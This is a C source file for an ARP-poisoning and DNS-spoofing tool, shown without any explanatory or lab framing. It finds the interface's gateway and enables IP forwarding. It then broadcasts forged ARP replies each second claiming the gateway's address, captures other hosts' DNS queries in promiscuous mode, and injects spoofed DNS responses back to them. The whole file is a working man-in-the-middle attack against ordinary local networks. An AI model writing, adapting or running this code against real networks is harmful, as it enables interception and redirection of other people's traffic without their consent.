#include <arpa/inet.h>
#include <libnet.h>
#include <linux/rtnetlink.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <pcap.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

struct reqhdr {
  struct nlmsghdr nl;
  struct rtmsg rt;
};

int if_index(char *if_name) {
  int sfd = socket(PF_INET, SOCK_DGRAM, 0);
  if (sfd < 0) {
    perror("socket");
    return -1;
  }
  struct ifreq ifr;
  memset(&ifr, 0, sizeof(struct ifreq));
  strncpy(ifr.ifr_name, if_name, IFNAMSIZ - 1);
  if (ioctl(sfd, SIOCGIFINDEX, &ifr) < 0) {
    perror("ioctl");
    close(sfd);
    return -1;
  }
  close(sfd);
  printf("[*] Interface %s has index %d\n", if_name, ifr.ifr_ifindex);
  return ifr.ifr_ifindex;
}

char *ip_addr(char *if_name) {
  int sfd = socket(PF_INET, SOCK_DGRAM, 0);
  if (sfd < 0) {
    perror("socket");
    return NULL;
  }
  struct ifreq ifr;
  memset(&ifr, 0, sizeof(struct ifreq));
  strncpy(ifr.ifr_name, if_name, IFNAMSIZ - 1);
  if (ioctl(sfd, SIOCGIFINDEX, &ifr) < 0) {
    perror("ioctl");
    close(sfd);
    return NULL;
  }
  if (ioctl(sfd, SIOCGIFADDR, &ifr) < 0) {
    perror("ioctl");
    close(sfd);
    return NULL;
  }
  struct sockaddr_in *addr = (struct sockaddr_in *)&ifr.ifr_addr;
  char ip_str[INET_ADDRSTRLEN];
  if (inet_ntop(AF_INET, &addr->sin_addr, ip_str, sizeof(ip_str)) == NULL) {
    perror("inet_ntop");
    close(sfd);
    return NULL;
  }
  close(sfd);
  printf("[*] IP address of interface %s is %s\n", if_name, ip_str);
  return strdup(ip_str);
}

char *gateway_ip_addr(int if_index) {
  int sfd = socket(PF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
  if (sfd < 0) {
    perror("socket");
    return NULL;
  }
  struct sockaddr_nl snl;
  memset(&snl, 0, sizeof(struct sockaddr_nl));
  snl.nl_family = AF_NETLINK;
  snl.nl_pid = 0;
  struct reqhdr req;
  memset(&req, 0, sizeof(struct reqhdr));
  req.nl.nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg));
  req.nl.nlmsg_type = RTM_GETROUTE;
  req.nl.nlmsg_flags = NLM_F_REQUEST | NLM_F_DUMP;
  req.nl.nlmsg_seq = 0;
  req.nl.nlmsg_pid = getpid();
  req.rt.rtm_family = AF_INET;
  req.rt.rtm_table = RT_TABLE_MAIN;
  int err = sendto(sfd, (void *)&req, sizeof(struct reqhdr), 0,
                   (struct sockaddr *)&snl, sizeof(struct sockaddr_nl));
  if (err < 0) {
    perror("sendto");
    close(sfd);
    return NULL;
  }
  char buf[8192];
  memset(&buf, 0, sizeof(buf));
  char *ptr = buf;
  int len = 0;
  struct nlmsghdr *nlp;
  do {
    int rclen = recv(sfd, ptr, sizeof(buf) - len, 0);
    if (rclen < 0) {
      perror("recv");
      close(sfd);
      return NULL;
    }
    nlp = (struct nlmsghdr *)ptr;
    ptr += rclen;
    len += rclen;
  } while (len < sizeof(buf) && nlp->nlmsg_flags & NLM_F_MULTI &&
           nlp->nlmsg_type != NLMSG_DONE);

  nlp = (struct nlmsghdr *)buf;
  for (; NLMSG_OK(nlp, len); nlp = NLMSG_NEXT(nlp, len)) {
    struct rtmsg *rtp = (struct rtmsg *)NLMSG_DATA(nlp);
    if (rtp->rtm_table != RT_TABLE_MAIN)
      continue;
    struct rtattr *atp = (struct rtattr *)RTM_RTA(rtp);
    int atlen = RTM_PAYLOAD(nlp);
    char dst[32], msk[32], gwy[32], dev[32];
    for (; RTA_OK(atp, atlen); atp = RTA_NEXT(atp, atlen)) {
      if (atp->rta_type == RTA_DST) {
        inet_ntop(AF_INET, RTA_DATA(atp), dst, sizeof(dst));
      } else if (atp->rta_type == RTA_OIF) {
        snprintf(dev, sizeof(dev), "%u", *(unsigned int *)RTA_DATA(atp));
      } else if (atp->rta_type == RTA_GATEWAY) {
        inet_ntop(AF_INET, RTA_DATA(atp), gwy, sizeof(gwy));
      }
    }
    if (strlen(dst) == 0 && atoi(dev) == if_index) {
      close(sfd);
      printf("[*] Gateway IP address for interface index %d is %s\n", if_index,
             gwy);
      return strdup(gwy);
    }
  }
  return NULL;
}

int ip_forwarding() {
  FILE *fp = fopen("/proc/sys/net/ipv4/ip_forward", "w");
  if (fp == NULL) {
    perror("fopen");
    return -1;
  }
  if (fprintf(fp, "1") < 0) {
    perror("fprintf");
    fclose(fp);
    return -1;
  }
  if (fclose(fp) != 0) {
    perror("fclose");
    return -1;
  }
  printf("[*] IP forwarding enabled\n");
  return 0;
}

struct arp_spoofing_args {
  char *interface;
  char *gateway_ip;
};

void *arp_spoofing(void *args) {
  struct arp_spoofing_args *spoof_args = (struct arp_spoofing_args *)args;
  char *interface = spoof_args->interface;
  char *gateway_ip = spoof_args->gateway_ip;
  char errbuf[LIBNET_ERRBUF_SIZE];
  libnet_t *ln = libnet_init(LIBNET_LINK, interface, errbuf);
  struct libnet_ether_addr *src_hw_addr;
  src_hw_addr = libnet_get_hwaddr(ln);
  if (src_hw_addr == NULL) {
    fprintf(stderr, "Error getting hardware address: %s\n", errbuf);
    return NULL;
  }
  u_int32_t target_ip_addr =
      libnet_name2addr4(ln, gateway_ip, LIBNET_DONT_RESOLVE);
  if (target_ip_addr == -1) {
    fprintf(stderr, "Error resolving IP address: %s\n", errbuf);
    return NULL;
  }
  u_int32_t zero_ip_addr =
      libnet_name2addr4(ln, "0.0.0.0", LIBNET_DONT_RESOLVE);
  if (zero_ip_addr == -1) {
    fprintf(stderr, "Error resolving IP address: %s\n", errbuf);
    return NULL;
  }
  u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
           zero_hw_addr[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  int err = libnet_autobuild_arp(ARPOP_REPLY, src_hw_addr->ether_addr_octet,
                                 (u_int8_t *)&target_ip_addr, zero_hw_addr,
                                 (u_int8_t *)&zero_ip_addr, ln);
  if (err == -1) {
    fprintf(stderr, "Error building ARP packet: %s\n", libnet_geterror(ln));
    return NULL;
  }
  err = libnet_autobuild_ethernet(bcast_hw_addr, ETHERTYPE_ARP, ln);
  if (err == -1) {
    fprintf(stderr, "Error building Ethernet header: %s\n",
            libnet_geterror(ln));
    return NULL;
  }
  printf("[*] ARP spoofing started on interface %s\n", interface);
  while (1) {
    err = libnet_write(ln);
    if (err == -1) {
      fprintf(stderr, "Error sending packet: %s\n", libnet_geterror(ln));
      return NULL;
    }
    sleep(1);
  }
  libnet_destroy(ln);
  return 0;
}

char *errbuf_pcap;
pcap_t *pcap_handle;

void cleanup() {
  pcap_close(pcap_handle);
  free(errbuf_pcap);
}

libnet_t *l;
char errbuf_libnet[PCAP_ERRBUF_SIZE];

void trap(u_char *user, const struct pcap_pkthdr *pkthdr,
          const u_char *packet) {
  const struct libnet_ethernet_hdr *eth = (struct libnet_ethernet_hdr *)packet;
  const struct ip *ip = (struct ip *)(packet + 14);
  const struct udphdr *udp = (struct udphdr *)((u_char *)ip + (ip->ip_hl * 4));

  const char *dns_payload = (char *)(udp + 1);
  int dns_len = ntohs(udp->uh_ulen) - sizeof(struct udphdr);

  printf("[*] DNS query from");
  printf(" %s to ", inet_ntoa(ip->ip_src));
  printf("%s\n", inet_ntoa(ip->ip_dst));

  int sockfd;
  sockfd = socket(AF_INET, SOCK_DGRAM, 0);
  if (sockfd < 0) {
    perror("socket");
    return;
  }

  struct sockaddr_in server_addr;
  memset(&server_addr, 0, sizeof(server_addr));
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(53);
  server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");

  struct sockaddr_in client_addr;
  int size = sendto(sockfd, dns_payload, dns_len, 0,
                    (struct sockaddr *)&server_addr, sizeof(server_addr));
  if (size < 0) {
    perror("sendto");
    close(sockfd);
    return;
  }

  char buffer[512];
  socklen_t addr_len = sizeof(client_addr);
  size = recvfrom(sockfd, buffer, sizeof(buffer), 0,
                  (struct sockaddr *)&server_addr, &addr_len);
  if (size < 0) {
    perror("recvfrom");
    close(sockfd);
    return;
  }

  printf("[*] DNS response received from local DNS server.\n");
  libnet_clear_packet(l);
  libnet_build_udp(53, ntohs(udp->uh_sport), LIBNET_UDP_H + size, 0, buffer,
                   size, l, 0);

  libnet_build_ipv4(LIBNET_IPV4_H + LIBNET_UDP_H + size, 0,
                    libnet_get_prand(LIBNET_PRu16), 0, 64, IPPROTO_UDP, 0,
                    ip->ip_dst.s_addr, ip->ip_src.s_addr, NULL, 0, l, 0);

  int bytes = libnet_write(l);
  if (bytes < 0) {
    fprintf(stderr, "libnet_write() failed: %s\n", libnet_geterror(l));
  } else {
    printf("[*] Spoofed DNS response sent (%d bytes)\n", bytes);
  }
  close(sockfd);
}

void *dns_spoofing(void *interface) {
  l = libnet_init(LIBNET_RAW4, interface, errbuf_libnet);
  char *if_char = (char *)interface;
  bpf_u_int32 netp, maskp;
  struct bpf_program fp;
  errbuf_pcap = malloc(PCAP_ERRBUF_SIZE);
  pcap_handle = pcap_create(if_char, errbuf_pcap);
  pcap_set_promisc(pcap_handle, 1);
  pcap_set_snaplen(pcap_handle, 65535);
  pcap_set_timeout(pcap_handle, 1000);
  pcap_activate(pcap_handle);
  pcap_lookupnet(if_char, &netp, &maskp, errbuf_pcap);
  char *ip_str = ip_addr(interface);
  char *filter = malloc(256);
  int err =
      sprintf(filter, "ip and udp and dst port 53 and not src host %s", ip_str);
  if (err < 0) {
    fprintf(stderr, "Error creating filter string\n");
    exit(EXIT_FAILURE);
  }
  if (pcap_compile(pcap_handle, &fp, filter, 0, maskp) < 0) {
    pcap_perror(pcap_handle, "pcap_compile()");
    exit(EXIT_FAILURE);
  }
  if (pcap_setfilter(pcap_handle, &fp) < 0) {
    pcap_perror(pcap_handle, "pcap_setfilter()");
    exit(EXIT_FAILURE);
  }
  if (pcap_setfilter(pcap_handle, &fp) < 0) {
    pcap_perror(pcap_handle, "pcap_setfilter()");
    exit(EXIT_FAILURE);
  }
  if (pcap_loop(pcap_handle, -1, trap, NULL) < 0) {
    pcap_perror(pcap_handle, "pcap_loop()");
    exit(EXIT_FAILURE);
  }
  return NULL;
}

int main(int argc, char **argv) {
  if (argc < 2) {
    fprintf(stderr, "Usage: %s <interface>\n", argv[0]);
    return EXIT_FAILURE;
  }
  char *interface = argv[1];
  int index = if_index(interface);
  if (index < 0) {
    fprintf(stderr, "Error getting interface index\n");
    return EXIT_FAILURE;
  }
  char *gateway = gateway_ip_addr(index);
  if (gateway == NULL) {
    fprintf(stderr, "Error getting gateway IP address\n");
    return EXIT_FAILURE;
  }
  if (ip_forwarding() < 0) {
    fprintf(stderr, "Error enabling IP forwarding\n");
    free(gateway);
    return EXIT_FAILURE;
  }
  pthread_t arp_thread, dns_thread;
  struct arp_spoofing_args args;
  args.interface = interface;
  args.gateway_ip = gateway;
  if (pthread_create(&arp_thread, NULL, arp_spoofing, (void *)&args) != 0) {
    fprintf(stderr, "Error creating ARP spoofing thread\n");
    free(gateway);
    return EXIT_FAILURE;
  }
  if (pthread_create(&dns_thread, NULL, dns_spoofing, (void *)interface) != 0) {
    fprintf(stderr, "Error creating DNS spoofing thread\n");
    free(gateway);
    return EXIT_FAILURE;
  }
  pthread_join(dns_thread, NULL);
  pthread_join(arp_thread, NULL);
  return 0;
}
